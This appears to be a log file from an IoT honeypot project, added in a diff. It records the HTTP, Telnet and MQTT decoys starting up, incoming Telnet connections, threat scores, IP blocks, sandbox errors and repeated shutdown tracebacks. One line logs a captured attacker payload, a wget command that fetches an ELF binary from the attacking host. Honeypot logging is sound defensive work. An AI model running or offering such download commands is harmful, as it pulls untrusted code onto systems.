+2025-11-20 20:17:45,268 [WARNING] CRITICAL THREAT DETECTED FROM 10.157.84.42. Score: 80
+2025-11-20 20:17:45,326 [WARNING] ACTION: Blocking malicious IP: 10.157.84.42
+2025-11-20 20:23:40,887 [ERROR] Task exception was never retrieved
+future: <Task finished name='Task-1' coro=<main() done, defined at /home/deceptiot/DeceptiIoT/main.py:25> exception=KeyboardInterrupt()>
+Traceback (most recent call last):
+  File "/home/deceptiot/DeceptiIoT/main.py", line 50, in <module>
+    asyncio.run(main())
+  File "/usr/lib/python3.10/asyncio/runners.py", line 47, in run
+    _cancel_all_tasks(loop)
+  File "/usr/lib/python3.10/asyncio/runners.py", line 63, in _cancel_all_tasks
+    loop.run_until_complete(tasks.gather(*to_cancel, return_exceptions=True))
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 636, in run_until_complete
+    self.run_forever()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 603, in run_forever
+    self._run_once()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 1909, in _run_once
+    handle._run()
+  File "/usr/lib/python3.10/asyncio/events.py", line 80, in _run
+    self._context.run(self._callback, *self._args)
+  File "/home/deceptiot/DeceptiIoT/main.py", line 41, in main
+    await asyncio.gather(
+  File "/usr/lib/python3.10/asyncio/runners.py", line 44, in run
+    return loop.run_until_complete(main)
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 636, in run_until_complete
+    self.run_forever()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 603, in run_forever
+    self._run_once()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 1909, in _run_once
+    handle._run()
+  File "/usr/lib/python3.10/asyncio/events.py", line 80, in _run
+    self._context.run(self._callback, *self._args)
+  File "/home/deceptiot/DeceptiIoT/main.py", line 23, in start_dashboard
+    await server.serve()
+  File "/home/deceptiot/DeceptiIoT/venv/lib/python3.10/site-packages/uvicorn/server.py", line 70, in serve
+    with self.capture_signals():
+  File "/usr/lib/python3.10/contextlib.py", line 142, in __exit__
+    next(self.gen)
+  File "/home/deceptiot/DeceptiIoT/venv/lib/python3.10/site-packages/uvicorn/server.py", line 331, in capture_signals
+    signal.raise_signal(captured_signal)
+KeyboardInterrupt
+2025-11-20 21:09:29,197 [INFO] HTTP Honeypot active on port 8080
+2025-11-20 21:09:29,312 [INFO] Telnet Honeypot active on port 2323
+2025-11-20 21:09:29,313 [INFO] MQTT Honeypot active on port 1883
+2025-11-20 21:09:45,145 [INFO] Unblocking IP: 10.157.84.170
+2025-11-20 21:10:47,684 [INFO] Unblocking IP: 10.157.84.42
+2025-11-20 21:16:39,649 [INFO] New Telnet connection from 10.157.84.170
+2025-11-20 21:17:24,616 [WARNING] CRITICAL THREAT DETECTED FROM 10.157.84.170. Score: 95
+2025-11-20 21:17:24,622 [INFO] Sandboxing payload from 10.157.84.170: wget http://10.157.84.170/hello.elf
+2025-11-20 21:17:28,745 [ERROR] Sandbox failure for 10.157.84.170: 404 Client Error for http+docker://localhost/v1.50/containers/dfdf071174016c8ad7c6872be5e5305922a050f958190dfe610b6fa062f04731/kill: Not Found ("cannot kill container: dfdf071174016c8ad7c6872be5e5305922a050f958190dfe610b6fa062f04731: No such container: dfdf071174016c8ad7c6872be5e5305922a050f958190dfe610b6fa062f04731")
+2025-11-20 21:17:28,829 [WARNING] ACTION: Blocking malicious IP: 10.157.84.170
+2025-11-20 21:20:56,231 [INFO] New Telnet connection from 10.157.84.42
+2025-11-20 21:21:16,516 [WARNING] CRITICAL THREAT DETECTED FROM 10.157.84.42. Score: 80
+2025-11-20 21:21:16,735 [WARNING] ACTION: Blocking malicious IP: 10.157.84.42
+2025-11-20 21:24:31,241 [ERROR] Task exception was never retrieved
+future: <Task finished name='Task-1' coro=<main() done, defined at /home/deceptiot/DeceptiIoT/main.py:25> exception=KeyboardInterrupt()>
+Traceback (most recent call last):
+  File "/home/deceptiot/DeceptiIoT/main.py", line 50, in <module>
+    asyncio.run(main())
+  File "/usr/lib/python3.10/asyncio/runners.py", line 47, in run
+    _cancel_all_tasks(loop)
+  File "/usr/lib/python3.10/asyncio/runners.py", line 63, in _cancel_all_tasks
+    loop.run_until_complete(tasks.gather(*to_cancel, return_exceptions=True))
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 636, in run_until_complete
+    self.run_forever()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 603, in run_forever
+    self._run_once()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 1909, in _run_once
+    handle._run()
+  File "/usr/lib/python3.10/asyncio/events.py", line 80, in _run
+    self._context.run(self._callback, *self._args)
+  File "/home/deceptiot/DeceptiIoT/main.py", line 41, in main
+    await asyncio.gather(
+  File "/usr/lib/python3.10/asyncio/runners.py", line 44, in run
+    return loop.run_until_complete(main)
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 636, in run_until_complete
+    self.run_forever()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 603, in run_forever
+    self._run_once()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 1909, in _run_once
+    handle._run()
+  File "/usr/lib/python3.10/asyncio/events.py", line 80, in _run
+    self._context.run(self._callback, *self._args)
+  File "/home/deceptiot/DeceptiIoT/main.py", line 23, in start_dashboard
+    await server.serve()
+  File "/home/deceptiot/DeceptiIoT/venv/lib/python3.10/site-packages/uvicorn/server.py", line 70, in serve
+    with self.capture_signals():
+  File "/usr/lib/python3.10/contextlib.py", line 142, in __exit__
+    next(self.gen)
+  File "/home/deceptiot/DeceptiIoT/venv/lib/python3.10/site-packages/uvicorn/server.py", line 331, in capture_signals
+    signal.raise_signal(captured_signal)
+KeyboardInterrupt
+2025-11-21 03:14:26,324 [INFO] HTTP Honeypot active on port 8080
+2025-11-21 03:14:26,598 [INFO] Telnet Honeypot active on port 2323
+2025-11-21 03:14:26,599 [INFO] MQTT Honeypot active on port 1883
+2025-11-21 04:26:08,697 [ERROR] Task exception was never retrieved
+future: <Task finished name='Task-1' coro=<main() done, defined at /home/deceptiot/DeceptiIoT/main.py:25> exception=KeyboardInterrupt()>
+Traceback (most recent call last):
+  File "/home/deceptiot/DeceptiIoT/main.py", line 50, in <module>
+    asyncio.run(main())
+  File "/usr/lib/python3.10/asyncio/runners.py", line 47, in run
+    _cancel_all_tasks(loop)
+  File "/usr/lib/python3.10/asyncio/runners.py", line 63, in _cancel_all_tasks
+    loop.run_until_complete(tasks.gather(*to_cancel, return_exceptions=True))
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 636, in run_until_complete
+    self.run_forever()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 603, in run_forever
+    self._run_once()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 1909, in _run_once
+    handle._run()
+  File "/usr/lib/python3.10/asyncio/events.py", line 80, in _run
+    self._context.run(self._callback, *self._args)
+  File "/home/deceptiot/D2025-11-21 05:30:46,752 [INFO] HTTP Honeypot active on port 8080
+2025-11-21 05:30:47,158 [INFO] Telnet Honeypot active on port 2323
+2025-11-21 05:30:47,160 [INFO] MQTT Honeypot active on port 1883
+2025-11-21 05:32:48,477 [INFO] New Telnet connection from 10.157.84.138
+2025-11-21 07:17:37,487 [INFO] HTTP Honeypot active on port 8080
+2025-11-21 07:17:48,201 [INFO] HTTP Honeypot active on port 8080
+2025-11-26 04:05:58,952 [INFO] HTTP Honeypot active on port 8080
+2025-11-26 04:06:00,941 [INFO] Telnet Honeypot active on port 2323
+2025-11-26 04:06:00,942 [INFO] MQTT Honeypot active on port 1883
+2025-11-26 04:15:05,478 [INFO] Unblocking IP: 10.157.84.42
+2025-11-26 04:19:12,892 [ERROR] Task exception was never retrieved
+future: <Task finished name='Task-1' coro=<main() done, defined at /home/deceptiot/DeceptiIoT/main.py:25> exception=KeyboardInterrupt()>
+Traceback (most recent call last):
+  File "/home/deceptiot/DeceptiIoT/main.py", line 50, in <module>
+    asyncio.run(main())
+  File "/usr/lib/python3.10/asyncio/runners.py", line 47, in run
+    _cancel_all_tasks(loop)
+  File "/usr/lib/python3.10/asyncio/runners.py", line 63, in _cancel_all_tasks
+    loop.run_until_complete(tasks.gather(*to_cancel, return_exceptions=True))
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 636, in run_until_complete
+    self.run_forever()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 603, in run_forever
+    self._run_once()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 1909, in _run_once
+    handle._run()
+  File "/usr/lib/python3.10/asyncio/events.py", line 80, in _run
+    self._context.run(self._callback, *self._args)
+  File "/home/deceptiot/DeceptiIoT/main.py", line 41, in main
+    await asyncio.gather(
+  File "/usr/lib/python3.10/asyncio/runners.py", line 44, in run
+    return loop.run_until_complete(main)
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 636, in run_until_complete
+    self.run_forever()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 603, in run_forever
+    self._run_once()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 1909, in _run_once
+    handle._run()
+  File "/usr/lib/python3.10/asyncio/events.py", line 80, in _run
+    self._context.run(self._callback, *self._args)
+  File "/home/deceptiot/DeceptiIoT/main.py", line 23, in start_dashboard
+    await server.serve()
+  File "/home/deceptiot/DeceptiIoT/venv/lib/python3.10/site-packages/uvicorn/server.py", line 70, in serve
+    with self.capture_signals():
+  File "/usr/lib/python3.10/contextlib.py", line 142, in __exit__
+    next(self.gen)
+  File "/home/deceptiot/DeceptiIoT/venv/lib/python3.10/site-packages/uvicorn/server.py", line 331, in capture_signals
+    signal.raise_signal(captured_signal)
+KeyboardInterrupt
+2025-11-26 04:25:28,672 [INFO] HTTP Honeypot active on port 8080
+2025-11-26 04:25:28,760 [INFO] Telnet Honeypot active on port 2323
+2025-11-26 04:25:28,760 [INFO] MQTT Honeypot active on port 1883
+2025-12-03 03:32:29,572 [INFO] HTTP Honeypot active on port 8080
+2025-12-03 03:32:30,606 [INFO] Telnet Honeypot active on port 2323
+2025-12-03 03:32:30,607 [INFO] MQTT Honeypot active on port 1883
+2025-12-03 04:00:41,645 [INFO] HTTP Honeypot active on port 8080
+2025-12-03 04:00:41,951 [INFO] Telnet Honeypot active on port 2323
+2025-12-03 04:00:41,952 [INFO] MQTT Honeypot active on port 1883
+2025-12-03 07:45:03,840 [INFO] HTTP Honeypot active on port 8080
+2025-12-03 07:45:04,701 [INFO] Telnet Honeypot active on port 2323
+2025-12-03 07:45:04,702 [INFO] MQTT Honeypot active on port 1883
+2025-12-03 08:32:22,143 [INFO] HTTP Honeypot active on port 8080
+2025-12-03 08:32:22,768 [INFO] Telnet Honeypot active on port 2323
+2025-12-03 08:32:22,770 [INFO] MQTT Honeypot active on port 1883
